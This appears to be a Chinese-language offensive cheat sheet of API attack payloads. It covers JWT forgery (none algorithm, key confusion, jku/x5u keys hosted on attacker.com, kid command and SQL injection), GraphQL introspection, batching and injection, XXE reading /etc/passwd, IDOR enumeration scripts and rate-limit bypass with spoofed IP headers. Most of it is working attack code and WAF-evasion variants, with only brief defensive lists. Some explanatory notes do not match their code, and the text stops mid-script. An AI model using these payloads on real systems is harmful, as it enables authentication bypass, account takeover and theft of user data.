# API安全

_12 条 web payload_

### JWT安全漏洞  `jwt-security`
_JSON Web Token安全漏洞利用_
子类：**JWT** · tags: `jwt` `token` `authentication`

**前置条件：**
- 使用JWT进行认证
- JWT配置或验证存在问题

**攻击链：**

**1. 解码JWT**
> 解码JWT内容
```
JWT格式: header.payload.signature
解码:
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d
或使用jwt.io
```
**语法解析：**
- `header` — 算法和令牌类型 _value_
- `payload` — 声明数据 _value_
- `signature` — 签名验证 _value_

**2. None算法攻击**
> 使用None算法绕过签名验证
```
修改header为:
{"alg":"none","typ":"JWT"}
Base64编码后构造:
HEADER.PAYLOAD.
(签名部分为空)
```
**语法解析：**
- `"alg":"none"` — 指定无签名算法 _value_

**3. 弱密钥破解**
> 破解弱密钥
```
使用hashcat破解:
hashcat -m 16500 jwt.txt wordlist.txt
使用jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt
```
**语法解析：**
- `-m 16500` — hashcat JWT模式 _value_

**4. 密钥混淆攻击**
> 算法混淆攻击
```
将RS256算法改为HS256:
{"alg":"HS256","typ":"JWT"}
使用公钥作为HMAC密钥签名
```
**语法解析：**
- `RS256` — RSA非对称算法 _value_
- `HS256` — HMAC对称算法 _value_

**5. 修改Payload**
> 修改JWT声明
```
修改payload中的用户信息:
{"sub":"admin","iat":1234567890}
重新编码并使用已知密钥签名
```
**语法解析：**
- `sub` — Subject声明，通常是用户ID _value_
- `iat` — 签发时间 _value_

**WAF/EDR 绕过变体：**

**JWK/JKU头部注入**
> 通过在JWT Header中注入jwk(内嵌密钥)或jku(远程密钥集URL)指向攻击者控制的密钥，使服务端使用攻击者密钥验证签名
```
# JWK内嵌公钥注入:
# 在JWT Header中嵌入攻击者的公钥:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"attacker_n","e":"AQAB"}}
# 服务端使用Header中的JWK验证签名

# JKU远程密钥集注入:
{"alg":"RS256","typ":"JWT","jku":"http://attacker.com/.well-known/jwks.json"}
# 服务端从攻击者控制的URL获取密钥
```
**语法解析：**
- `# JWK内嵌公钥注入:` — 主要命令 _command_
- `...` — 共7行 _value_

**x5c证书链注入**
> 通过x5c头部注入攻击者自签证书链，使服务端从证书中提取公钥进行验证，攻击者用对应私钥签名即可伪造任意JWT
```
# 生成自签名证书:
openssl req -x509 -nodes -newkey rsa:2048 -keyout attacker.key -out attacker.crt -subj "/CN=attacker"

# 构造JWT Header:
{"alg":"RS256","x5c":["ATTACKER_CERT_BASE64"]}

# 用攻击者私钥签名，x5c中放入攻击者证书
# 服务端从x5c提取公钥验证签名，攻击者自签即可通过

# 使用jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key
```
**语法解析：**
- `# 生成自签名证书:` — 主要命令 _command_
- `...` — 共8行 _value_


**概述：** JWT(JSON Web Token)是现代Web应用中最常用的认证机制，其安全漏洞包括算法混淆(none/HS256→RS256)、密钥爆破、未验证签名、声明篡改等，可导致认证绕过和权限提升。

**漏洞原理：** JWT安全漏洞：1)alg:none漏洞(不验证签名) 2)HS256/RS256算法混淆(用公钥作HMAC密钥) 3)弱密钥可被字典爆破 4)未验证exp导致永不过期 5)kid参数注入(目录遍历/SQL注入) 6)jku/x5u头指向恶意密钥。

**利用方法：** 完整利用流程：
1. 获取JWT Token
2. 解码分析内容
3. 尝试None算法绕过
4. 尝试破解弱密钥
5. 修改Payload提权

**防御措施：** 防御措施：
1. 使用强密钥
2. 禁用None算法
3. 正确验证签名
4. 设置合理的过期时间
5. 使用HTTPS传输

---

### GraphQL注入攻击  `graphql-injection`
_GraphQL API注入与信息泄露攻击_
子类：**GraphQL** · tags: `graphql` `api` `injection` `introspection`

**前置条件：**
- 目标使用GraphQL API
- 存在未授权访问或注入点

**攻击链：**

**1. 探测GraphQL端点**
> 探测GraphQL端点
```
# 常见GraphQL端点
/graphql
/api/graphql
/graphql/api
/query
/graphql.php

# 发送POST请求
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```
**语法解析：**
- `<!ENTITY>` — 实体定义 _tag_
- `SYSTEM` — 外部实体 _keyword_
- `file://` — 文件协议 _technique_

**2. 内省查询**
> 执行内省查询获取API结构
```
# 完整内省查询
{
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}

# 使用工具
gqlscan -u http://target.com/graphql
inql -t http://target.com/graphql
```
**语法解析：**
- `__schema` — 获取整个API架构 _value_
- `fields` — 获取类型的所有字段 _value_
- `args` — 获取字段参数 _value_

**3. 批量查询攻击**
> 使用批量查询绕过限制
```
# 别名批量查询
{
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
  user4: user(id: 4) { name email }
}

# 批量查询绕过速率限制
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"}
]
```
**语法解析：**
- `user1: user(id: 1)` — 使用别名同时查询多个用户 _value_
- `[{},{},{}]` — 数组形式批量查询 _value_

**4. SQL注入**
> GraphQL中的SQL注入
```
# GraphQL中的SQL注入
{
  user(name: "admin' OR '1'='1") {
    id
    name
    password
  }
}

# 通过参数注入
mutation {
  createUser(input: {
    name: "test' OR 1=1--"
  }) {
    id
  }
}
```

**5. NoSQL注入**
> GraphQL中的NoSQL注入
```
# MongoDB注入
{
  user(filter: {
    $or: [{name: "admin"}, {name: "root"}]
  }) {
    name
    password
  }
}

# 通过JSON注入
{
  search(text: "{\"$ne\": \"\"}") {
    results
  }
}
```
**语法解析：**
- `$or` — MongoDB逻辑运算符 _variable_
- `$ne` — 不等于操作符 _variable_

**6. 信息泄露**
> 获取隐藏字段和敏感信息
```
# 获取隐藏字段
{
  user(id: 1) {
    name
    email
    password
    apiKey
    secretKey
    token
    __typename
  }
}

# 枚举所有可能字段
{
  __type(name: "User") {
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```
**语法解析：**
- `__typename` — 获取对象类型名称 _value_
- `__type` — 查询特定类型信息 _value_

**WAF/EDR 绕过变体：**

**字段建议绕过**
> 利用字段建议和片段枚举
```
# 利用字段建议功能
query {
  userr(id: 1) { name }
}
# 返回: Did you mean "user"?

# 枚举隐藏字段
query {
  user(id: 1) {
    __typename
    ...on AdminUser {
      adminSecret
    }
  }
}
```
**语法解析：**
- `...on AdminUser` — GraphQL内联片段 _value_

**指令注入**
> 使用GraphQL指令绕过
```
# 使用指令绕过
query {
  user(id: 1) @deprecated {
    name
  }
}

# 自定义指令攻击
mutation @skip(if: false) {
  deleteUser(id: 1)
}
```
**语法解析：**
- `@deprecated` — 弃用指令 _value_
- `@skip` — 条件跳过指令 _value_


**概述：** GraphQL注入攻击利用GraphQL查询语言的灵活性进行信息泄露和数据操纵，包括深度嵌套查询(DoS)、字段建议泄露Schema信息、变量注入绕过查询限制、以及通过别名实现批量查询等。

**漏洞原理：** GraphQL特有漏洞：1)嵌套查询DoS(深度嵌套导致指数级数据库查询) 2)字段建议泄露(拼写错误时返回相似字段名) 3)别名批量查询(一次请求查询数千条记录) 4)变量类型不匹配绕过输入校验 5)指令注入(@skip/@include滥用)。

**利用方法：** 完整利用流程：
1. 探测GraphQL端点
2. 执行内省查询获取API结构
3. 分析敏感字段和操作
4. 构造注入payload
5. 批量查询绕过限制

**防御措施：** 防御措施：
1. 生产环境禁用内省
2. 实施输入验证
3. 限制查询深度和复杂度
4. 实施认证授权
5. 限制批量查询

---

### GraphQL内省攻击  `graphql-introspection`
_利用GraphQL内省功能获取API结构_
子类：**GraphQL内省** · tags: `graphql` `introspection` `enumeration` `api`

**前置条件：**
- 目标使用GraphQL
- 内省功能未禁用

**攻击链：**

**1. 基础内省**
> 基础内省查询
```
# 获取所有类型
{
  __schema {
    types {
      name
    }
  }
}

# 获取查询类型
{
  __schema {
    queryType {
      name
      fields {
        name
        description
      }
    }
  }
}
```
**语法解析：**
- `__schema` — GraphQL元数据根 _value_
- `queryType` — 获取所有查询操作 _value_

**2. 完整内省**
> 完整内省查询获取所有信息
```
# 获取完整API结构
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
```
**语法解析：**
- `fragment` — GraphQL片段定义 _value_
- `includeDeprecated` — 包含已弃用字段 _encoding_

**3. 使用工具分析**
> 使用工具分析GraphQL
```
# GraphQL Voyager - 可视化分析
# https://github.com/APIs-guru/graphql-voyager

# 使用CLI工具
npm install -g graphql-cli
graphql-cli introspect http://target.com/graphql

# InQL扫描
pip install inql
inql -t http://target.com/graphql

# GraphQL Cop
npm install -g graphql-cop
graphql-cop -t http://target.com/graphql
```

**WAF/EDR 绕过变体：**

**绕过内省禁用**
> 绕过内省禁用检测
```
# 某些实现只检查特定字符串
# 尝试不同格式
query { __schema { types { name } } }
query IntrospectionQuery { __schema { types { name } } }
{"query":"{__schema{types{name}}}"

# 使用GET请求
curl "http://target.com/graphql?query={__schema{types{name}}}"
```


**概述：** GraphQL内省(Introspection)是GraphQL规范内置的Schema自描述功能，允许客户端查询API的完整类型系统、字段定义和参数信息。在生产环境未禁用时将泄露所有API结构信息。

**漏洞原理：** GraphQL内省通过__schema/__type查询获取：所有类型(Types)和字段(Fields)定义、查询(Query)/变更(Mutation)/订阅(Subscription)的完整接口、字段参数和返回类型、枚举值、接口和联合类型等，等同于泄露完整API文档。

**利用方法：** 完整利用流程：
1. 发送内省查询
2. 分析返回的API结构
3. 识别敏感操作和字段
4. 构造恶意查询

**防御措施：** 防御GraphQL内省泄露：在生产环境禁用内省查询(大多数GraphQL框架支持配置)，对__schema/__type查询实施访问控制(仅允许管理员)，使用查询白名单(Persisted Queries)限制可执行的查询，部署GraphQL网关进行查询分析。

---

### GraphQL批量查询攻击  `graphql-batching`
_利用GraphQL批量查询绕过速率限制_
子类：**GraphQL批量查询** · tags: `graphql` `batching` `rate-limit` `bypass`

**前置条件：**
- 目标使用GraphQL
- 存在速率限制

**攻击链：**

**1. 别名批量查询**
> 使用别名批量查询
```
# 使用别名一次查询多个用户
query {
  user1: user(id: 1) { name email password }
  user2: user(id: 2) { name email password }
  user3: user(id: 3) { name email password }
  user4: user(id: 4) { name email password }
  user5: user(id: 5) { name email password }
}

# 批量枚举
query {
  users: allUsers(limit: 1000) { id name email }
}
```
**语法解析：**
- `user1: user(id: 1)` — 别名定义 _value_
- `limit: 1000` — 限制返回数量 _value_

**2. 数组批量查询**
> 使用数组批量查询
```
# 发送多个查询数组
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"},
  {"query": "{ user(id: 4) { name } }"}
]

# 使用curl发送
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"}]'
```
**语法解析：**
- `[{},{},{}]` — JSON数组格式 _value_
- `query` — GraphQL查询字段 _value_

**3. 暴力破解**
> 批量暴力破解
```
# 批量密码尝试
mutation {
  attempt1: login(email: "admin@test.com", password: "password1") { token }
  attempt2: login(email: "admin@test.com", password: "password2") { token }
  attempt3: login(email: "admin@test.com", password: "password3") { token }
  attempt4: login(email: "admin@test.com", password: "password4") { token }
  attempt5: login(email: "admin@test.com", password: "password5") { token }
}

# 枚举用户
query {
  check1: userExists(email: "admin@test.com")
  check2: userExists(email: "root@test.com")
  check3: userExists(email: "test@test.com")
}
```
**语法解析：**
- `login` — 登录mutation _value_
- `userExists` — 用户存在检查查询 _value_

**WAF/EDR 绕过变体：**

**绕过批量限制**
> 绕过批量查询限制
```
# 分散查询
# 使用不同的查询格式
query BatchQuery {
  user1: user(id: 1) { ...UserFields }
  user2: user(id: 2) { ...UserFields }
}
fragment UserFields on User {
  name
  email
}

# 使用变量批量
query GetUser($ids: [ID!]!) {
  users(ids: $ids) {
    name
    email
  }
}
```
**语法解析：**
- `query{...}` — GraphQL查询 _format_


**概述：** GraphQL批量查询(Batching)允许在单个HTTP请求中发送多个查询操作，攻击者可利用此特性绕过基于请求频率的速率限制、进行暴力破解(OTP/密码)或发起批量数据查询。

**漏洞原理：** GraphQL批量查询攻击：1)在一个请求中发送数千个mutation操作暴力破解OTP/密码(绕过请求级速率限制) 2)使用alias在单个query中批量查询不同用户数据 3)数组形式batch查询([{query1},{query2},...])规避认证重试检测。

**利用方法：** 完整利用流程：
1. 测试是否支持批量查询
2. 使用别名或数组批量查询
3. 绕过速率限制
4. 批量枚举或暴力破解

**防御措施：** 防御措施：
1. 限制批量查询数量
2. 基于查询复杂度限流
3. 实施查询深度限制
4. 监控异常查询模式

---

### REST API安全测试  `rest-api-security`
_REST API安全测试与漏洞利用_
子类：**REST API** · tags: `rest` `api` `security` `testing`

**前置条件：**
- 目标使用REST API
- 了解API端点

**攻击链：**

**1. API端点发现**
> 发现API端点
```
# 常见API端点
/api/v1/users
/api/v2/products
/api/docs
/api/swagger.json
/api/openapi.json
/swagger-ui.html
/redoc

# 使用工具发现
ffuf -u http://target.com/api/FUZZ -w api_endpoints.txt
wfuzz -c -w api_wordlist.txt http://target.com/api/FUZZ
```
**语法解析：**
- `/api/v1/` — API版本路径 _value_
- `/swagger.json` — Swagger文档 _path_

**2. 认证测试**
> 测试API认证
```
# 测试未授权访问
curl http://target.com/api/v1/users

# 测试JWT
curl -H "Authorization: Bearer TOKEN" http://target.com/api/v1/users

# 测试API Key
curl -H "X-API-Key: key123" http://target.com/api/v1/users

# 测试Basic Auth
curl -u user:pass http://target.com/api/v1/users
```
**语法解析：**
- `Authorization: Bearer` — Bearer Token认证 _header_
- `X-API-Key` — API Key认证头 _value_

**3. HTTP方法测试**
> 测试HTTP方法
```
# 测试允许的HTTP方法
curl -X OPTIONS http://target.com/api/v1/users -v

# 尝试PUT修改
curl -X PUT -H "Content-Type: application/json" \
  -d '{"name":"hacked"}' http://target.com/api/v1/users/1

# 尝试DELETE删除
curl -X DELETE http://target.com/api/v1/users/1

# 尝试PATCH部分更新
curl -X PATCH -H "Content-Type: application/json" \
  -d '{"role":"admin"}' http://target.com/api/v1/users/1
```
**语法解析：**
- `OPTIONS` — 获取支持的HTTP方法 _method_
- `PUT` — 创建或替换资源 _method_
- `PATCH` — 部分更新资源 _method_

**4. 参数污染**
> 测试参数污染
```
# 参数污染测试
# 重复参数
/api/users?id=1&id=2
/api/users?name=admin&name=user

# 数组参数
/api/users?id[]=1&id[]=2
/api/users?name[0]=admin&name[1]=user

# JSON注入
/api/users?filter={"role":"admin"}
/api/users?sort=role&order=desc; SELECT SLEEP(5)--
```
**语法解析：**
- `id=1&id=2` — 重复参数 _value_
- `id[]=1` — 数组参数 _value_

**5. 内容类型测试**
> 测试内容类型处理
```
# 测试不同Content-Type
curl -H "Content-Type: application/xml" -d "<user><name>test</name></user>" http://target.com/api/users
curl -H "Content-Type: text/plain" -d "name=test" http://target.com/api/users
curl -H "Content-Type: application/x-www-form-urlencoded" -d "name=test" http://target.com/api/users

# XML外部实体
curl -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>' \
  http://target.com/api/users
```
**语法解析：**
- `Content-Type` — HTTP内容类型头 _value_
- `application/xml` — XML格式 _value_

**WAF/EDR 绕过变体：**

**API版本绕过**
> 使用不同API版本绕过
```
# 尝试不同API版本
/api/v1/users  # 可能已修复
/api/v2/users  # 可能未修复
/api/users     # 旧版本可能无保护

# 尝试内部API
/internal/api/users
/private/api/users
/_api/users
```
**语法解析：**
- `# 尝试不同API版本
/api/v1/users  # 可能已修复
/api/v2/users  # 可能未修复
/api/users     # 旧版` — 攻击载荷 _value_

**编码绕过**
> 使用编码绕过
```
# URL编码
curl http://target.com/api/users/%31  # /users/1

# Unicode编码
curl http://target.com/api/users/%u0031

# 双重URL编码
curl http://target.com/api/users/%2531
```
**语法解析：**
- `# URL编码
curl http://target.com/api/users/%31  # /users/1

# Unicode编码
curl h` — 攻击载荷 _value_


**概述：** REST API安全测试关注认证授权缺陷、输入验证不足、响应数据过度暴露、速率限制缺失等问题。API作为现代应用的核心，其安全性直接影响整个业务系统的数据安全。

**漏洞原理：** REST API常见漏洞：1)认证缺失(API端点无需认证即可访问) 2)BOLA/IDOR(通过遍历ID访问他人资源) 3)批量赋值(Mass Assignment,提交额外字段修改权限) 4)过度数据暴露(响应包含不必要的敏感字段) 5)缺乏速率限制。

**利用方法：** 完整利用流程：
1. 发现API端点和文档
2. 测试认证机制
3. 测试HTTP方法
4. 测试参数处理
5. 测试内容类型
6. 寻找注入点

**防御措施：** 防御措施：
1. 实施严格的认证授权
2. 限制HTTP方法
3. 输入验证和过滤
4. 速率限制
5. API版本管理
6. 安全的CORS配置

---

### JWT None算法攻击  `jwt-none-alg`
_利用JWT None算法绕过签名验证_
子类：**JWT安全** · tags: `jwt` `none` `algorithm` `bypass`

**前置条件：**
- 目标使用JWT认证
- 服务器未正确验证算法

**攻击链：**

**1. 解码JWT**
> 解码JWT令牌
```
# 在线解码
https://jwt.io

# 使用命令行
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d

# 使用Python
import jwt
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)
```
**语法解析：**
- `HEADER` — JWT头部，包含算法信息 _value_
- `PAYLOAD` — JWT载荷，包含用户数据 _value_

**2. 构造None算法Token**
> 构造None算法Token
```
# 修改头部为none算法
# 原始头部
{"alg":"HS256","typ":"JWT"}

# 修改为
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}

# 使用Python构造
import base64, json
header = {"alg":"none","typ":"JWT"}
payload = {"sub":"admin","iat":1516239022}
token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=") + "." + \
        base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=") + "."
print(token)
```
**语法解析：**
- `"alg":"none"` — 设置算法为none _value_
- `rstrip("=")` — 移除Base64填充 _value_

**3. 修改用户权限**
> 修改用户权限
```
# 修改payload提权
# 原始payload
{"sub":"user","role":"user","iat":1516239022}

# 修改为
{"sub":"admin","role":"admin","iat":1516239022}

# 完整攻击
import base64, json
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip("=")
token = header + "." + payload + "."
print(token)
```
**语法解析：**
- `"role":"admin"` — 修改角色为管理员 _value_
- `"sub":"admin"` — 修改主体为admin _value_

**4. 发送恶意Token**
> 发送恶意Token
```
# 使用curl发送
curl -H "Authorization: Bearer <MALICIOUS_TOKEN>" http://target.com/api/admin

# 空签名测试
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." http://target.com/api/admin
```
**语法解析：**
- `Bearer` — Bearer认证方案 _value_
- `.` — 空签名部分 _value_

**WAF/EDR 绕过变体：**

**算法混淆**
> 尝试算法变体
```
# 尝试不同变体
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":""}
{"alg":null}

# 移除alg字段
{"typ":"JWT"}
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 尝试不同变体
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":""}
{"alg":null}

# 移除alg字段
{"typ":"JWT"}` — 参数与载荷内容 _value_

**签名绕过**
> 签名绕过变体
```
# 空签名
header.payload.

# 任意签名
header.payload.anysignature

# 使用原始签名
# 某些库会忽略签名验证
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 空签名
header.payload.

# 任意签名
header.payload.anysignature

# 使用原始签名
# 某些库会忽略签名验证` — 参数与载荷内容 _value_


**概述：** JWT None算法攻击利用某些JWT库接受alg字段为"none"的Token(表示不需要签名验证)。攻击者将Token的算法改为none并移除签名部分，篡改payload中的声明(如提升角色)后即可绕过认证。

**漏洞原理：** JWT None算法漏洞：1)将Header中的alg改为"none"/"None"/"NONE"/"nOnE"等变体 2)移除Token第三部分(签名)或置空 3)修改Payload中的用户角色/ID/权限声明 4)重新Base64编码后发送。支持none算法的库会跳过签名验证。

**利用方法：** 完整利用流程：
1. 获取有效JWT Token
2. 解码分析Token结构
3. 修改算法为none
4. 修改payload提权
5. 移除或保留空签名
6. 发送恶意Token

**防御措施：** 防御措施：
1. 禁用none算法
2. 严格验证算法类型
3. 使用成熟的JWT库
4. 验证签名不为空
5. 设置token过期时间

---

### JWT密钥混淆攻击  `jwt-key-confusion`
_利用JWT算法混淆实现签名绕过_
子类：**JWT安全** · tags: `jwt` `algorithm` `confusion` `rs256`

**前置条件：**
- 目标使用RS256算法
- 可获取公钥

**攻击链：**

**1. 获取公钥**
> 获取JWT公钥
```
# 从证书获取
curl -k https://target.com/.well-known/jwks.json

# 从SSL证书获取
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout

# 从JWT头部获取
# 解码JWT头部，查找x5c或jku字段

# 常见公钥位置
/.well-known/jwks.json
/api/keys
/public.key
/pubkey.pem
```
**语法解析：**
- `jwks.json` — JSON Web Key Set _path_
- `x5c` — X.509证书链 _value_

**2. 算法混淆攻击**
> 算法混淆攻击
```
# 将RS256改为HS256
# 使用公钥作为HMAC密钥

import jwt
import base64

# 获取公钥
public_key = open("public.pem").read()

# 构造payload
payload = {"sub":"admin","role":"admin"}

# 使用公钥作为HMAC密钥签名
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```
**语法解析：**
- `RS256` — RSA签名算法 _value_
- `HS256` — HMAC签名算法 _value_
- `公钥作为密钥` — 使用公钥作为HMAC密钥 _value_

**3. 发送恶意Token**
> 发送恶意Token
```
# 使用构造的Token
curl -H "Authorization: Bearer <HS256_TOKEN>" http://target.com/api/admin

# Python脚本
import requests
headers = {"Authorization": f"Bearer {token}"}
response = requests.get("http://target.com/api/admin", headers=headers)
print(response.text)
```
**语法解析：**
- `curl` — HTTP请求工具 _command_
- `-H` — 自定义请求头 _parameter_
- `Authorization` — 认证头 _header_

**WAF/EDR 绕过变体：**

**kid注入**
> 通过kid参数注入
```
# kid参数注入
# 修改JWT头部kid字段
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}

# SQL注入kid
{"alg":"HS256","typ":"JWT","kid":"key UNION SELECT secret--"}

# 命令注入kid
{"alg":"HS256","typ":"JWT","kid":"|/bin/bash -c id"}
```
**语法解析：**
- `kid` — Key ID，指定使用的密钥 _value_

**jku/x5u绕过**
> 通过jku/x5u绕过
```
# jku指向攻击者服务器
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/.well-known/jwks.json"}

# x5u指向攻击者证书
{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}

# 在攻击者服务器托管恶意密钥
```
**语法解析：**
- `jku` — JWK Set URL _value_
- `x5u` — X.509 URL _value_


**概述：** JWT密钥混淆(Algorithm Confusion)攻击将RS256(非对称)签名改为HS256(对称)，然后使用公钥(通常可获取)作为HMAC密钥对Token签名，如果服务端使用同一密钥变量验证则攻击成功。

**漏洞原理：** JWT密钥混淆攻击原理：RS256用私钥签名/公钥验证，HS256用共享密钥签名/验证。当服务端代码用通用的"key"变量(存储公钥)进行验证时，攻击者将alg改为HS256，用公钥(可从/jwks.json或X509证书获取)签名Token即可通过验证。

**利用方法：** 完整利用流程：
1. 获取目标公钥
2. 将算法从RS256改为HS256
3. 使用公钥作为HMAC密钥签名
4. 发送恶意Token

**防御措施：** 防御措施：
1. 明确指定允许的算法
2. 不信任JWT中的alg字段
3. 使用白名单验证算法
4. 分离公钥和对称密钥验证逻辑

---

### IDOR不安全的直接对象引用  `api-idor`
_利用IDOR漏洞访问未授权资源_
子类：**IDOR** · tags: `idor` `api` `authorization` `bypass`

**前置条件：**
- 目标使用ID引用资源
- 存在授权检查缺陷

**攻击链：**

**1. 识别ID参数**
> 识别ID参数
```
# 常见ID参数位置
/api/users/123
/api/orders?id=123
/api/documents/abc-123
/api/profile?user_id=123

# 观察响应
# 记录不同ID返回的数据差异
```
**语法解析：**
- `/users/123` — URL路径中的ID _value_
- `?id=123` — 查询参数中的ID _value_

**2. 枚举ID**
> 枚举ID值
```
# 数字ID枚举
for i in $(seq 1 1000); do
  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/users/$i" >> output.txt
done

# 使用Burp Intruder
# Payload: Numbers 1-10000
# GET /api/users/{id}

# UUID枚举
# 使用ffuf
ffuf -u http://target.com/api/users/FUZZ -w uuid_list.txt -H "Authorization: Bearer TOKEN"
```
**语法解析：**
- `seq 1 1000` — 生成1到1000的数字 _value_
- `ffuf` — Web模糊测试工具 _command_

**3. 批量检测**
> 批量检测IDOR
```
# Python脚本批量检测
import requests

token = "YOUR_TOKEN"
for i in range(1, 100):
    r = requests.get(
        f"http://target.com/api/users/{i}",
        headers={"Authorization": f"Bearer {token}"}
    )
    if r.status_code == 200:
        print(f"ID {i}: {r.json()}")

# 检测数据泄露
# 比较不同用户访问同一ID的响应
```
**语法解析：**
- `Authorization` — 认证头 _header_

**4. 跨用户访问**
> 跨用户访问测试
```
# 尝试访问其他用户数据
# 用户A的Token访问用户B的数据

# 修改请求中的ID
GET /api/users/2  # 原本是用户1
GET /api/orders?user_id=2  # 原本是user_id=1

# 修改POST/PUT请求体
{
  "user_id": 2,  # 修改为其他用户ID
  "amount": 1000
}
```
**语法解析：**
- `user_id` — 请求体中的用户ID _value_

**WAF/EDR 绕过变体：**

**ID变体绕过**
> ID变体绕过
```
# 数字变体
/api/users/001
/api/users/1
/api/users/0x1
/api/users/1.0

# 编码绕过
/api/users/%31  # URL编码
/api/users/MSAg  # Base64编码

# 数组绕过
/api/users?id[]=1&id[]=2
/api/users[0]=1&users[1]=2
```
**语法解析：**
- `%xx` — URL编码 _encoding_
- `base64` — Base64编码 _encoding_

**参数污染**
> 参数污染绕过
```
# 参数污染
/api/users?id=1&id=2
/api/users?id=2&id=1

# JSON注入
{"id": 1, "id": 2}

# 批量操作
/api/users/batch?ids=1,2,3,4,5
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 参数污染
/api/users?id=1&id=2
/api/users?id=2&id=1

# JSON注入
{"id": 1, "id": 2}

# 批量操作
/api/users/batch?ids=1,2,3,4,5` — 参数与载荷内容 _value_


**概述：** IDOR(Insecure Direct Object Reference)不安全的直接对象引用是API中最常见的高危漏洞，攻击者通过修改请求中的对象标识符(用户ID/订单号/文件名)访问或操作其他用户的资源。

**漏洞原理：** IDOR漏洞表现形式：1)水平越权(GET /api/users/1001 → /api/users/1002查看他人资料) 2)垂直越权(普通用户访问管理员接口) 3)对象级授权缺失(修改/删除他人资源) 4)可预测的ID(自增数字/UUID可枚举) 5)批量IDOR(遍历导出数据)。

**利用方法：** 完整利用流程：
1. 识别使用ID的API端点
2. 使用自己的账户测试
3. 枚举其他ID值
4. 验证是否能访问其他用户数据
5. 批量枚举敏感数据

**防御措施：** 防御措施：
1. 实施对象级授权检查
2. 使用不可预测的ID(UUID)
3. 验证用户对资源的所有权
4. 记录异常访问模式
5. 实施速率限制

---

### API速率限制绕过  `api-rate-limit`
_绕过API速率限制进行暴力攻击_
子类：**速率限制** · tags: `api` `rate-limit` `bypass` `brute-force`

**前置条件：**
- 目标有速率限制
- 限制实现有缺陷

**攻击链：**

**1. 检测速率限制**
> 检测速率限制
```
# 快速发送请求检测限制
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" http://target.com/api/test
done

# 观察响应
# 429 Too Many Requests
# 403 Forbidden
# 自定义错误消息
```
**语法解析：**
- `429` — HTTP状态码，请求过多 _value_
- `%{http_code}` — curl输出HTTP状态码 _variable_

**2. IP绕过**
> 使用IP头绕过
```
# X-Forwarded-For绕过
curl -H "X-Forwarded-For: 1.2.3.4" http://target.com/api/test
curl -H "X-Forwarded-For: 1.2.3.5" http://target.com/api/test
curl -H "X-Forwarded-For: 1.2.3.6" http://target.com/api/test

# 其他IP头
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
True-Client-IP: 1.2.3.4

# 自动化
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 1.2.3.$i" http://target.com/api/test
done
```
**语法解析：**
- `X-Forwarded-For` — 代理转发的原始IP _value_
- `X-Real-IP` — 真实客户端IP _value_

**3. 分布式绕过**
> 分布式绕过速率限制
```
# 使用多个代理
# 配置代理池
proxies = [
    "http://proxy1:8080",
    "http://proxy2:8080",
    "http://proxy3:8080"
]

# Python脚本
import requests
